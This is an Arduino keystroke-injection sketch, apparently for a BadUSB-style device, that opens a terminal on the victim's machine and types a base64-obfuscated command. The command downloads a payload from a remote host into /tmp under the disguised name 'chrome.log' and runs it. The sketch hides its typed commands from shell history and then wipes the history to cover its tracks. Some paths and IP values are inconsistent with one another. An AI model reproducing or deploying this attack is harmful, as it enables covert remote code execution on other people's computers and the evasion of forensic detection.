#include <Keyboard.h>

  // Configuration
  const char* TARGET_IP = "192.168.1.100";
  const char* TARGET_PORT = "8000";
  const char* PAYLOAD_NAME = "payload.elf";

  // curl -s http://192.168.122.153:8000/payload.elf -o /tmp/chrome.log && chmod +x /tmp/chrome/.log && /tmp/chrome.log
  const char* ENCODED_CMD = "Y3VybCAtcyBodHRwOi8vMTkyLjE2OC4xMjIuMTUzOjgwMDAvcGF5bG9hZC5lbGYgLW8gL3RtcC9jaHJvbWUubG9nICYmIGNobW9kICt4IC90bXAvY2hyb21lLy5sb2cgJiYgL3RtcC9jaHJvbWUubG9nCg==";

  const int INITIAL_DELAY = 2000;

  void setup() {
    delay(INITIAL_DELAY);
    Keyboard.begin();

    // Open terminal
    openTerminal();
    delay(500);

    // Execute attack
    downloadAndExecute();

    // Cover tracks
    cleanup();

    Keyboard.end();
  }

  void loop() {}

  void openTerminal() {
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(KEY_RETURN);
    delay(100);
    Keyboard.releaseAll();
  }

  void downloadAndExecute() {
    // Space prefix (won't log to bash history)
    Keyboard.print(" echo ");
    Keyboard.print(ENCODED_CMD);
    Keyboard.print(" | base64 -d | bash 2>/dev/null");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);
  }

  void cleanup() {
    // Remove payload file
    Keyboard.print(" rm -f /tmp/p 2>/dev/null");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(50);

    // Clear command history
    Keyboard.print(" history -c");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(50);

    // Clear history file
    Keyboard.print(" cat /dev/null > ~/.bash_history");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(50);

    // Close terminal
    Keyboard.print(" exit");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
  }